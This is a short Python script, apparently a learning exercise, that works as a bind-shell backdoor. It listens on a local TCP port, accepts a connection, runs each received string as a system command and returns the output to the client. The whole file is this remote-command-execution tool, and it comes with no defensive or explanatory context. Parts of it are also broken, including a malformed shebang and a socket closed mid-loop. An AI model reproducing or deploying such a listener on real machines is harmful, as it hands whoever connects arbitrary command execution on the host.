#/usr/bin/python3
import socket 
import subprocess
# import threading 
server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

target = '127.0.0.1'
port = 12345

server.bind((target,port))
server.listen(4)

client,addr = server.accept()
conn =True
print(f'[LISTENING] on {port}')
while conn :
    print(f'[CONNECTED] with {addr}')
    res = client.recv(4096).decode('utf-8')
    cmdprocess = subprocess.run([res],text=True,capture_output=True)
    
    client.sendto(cmdprocess.stdout.encode('utf-8'), addr)
    server.close()
    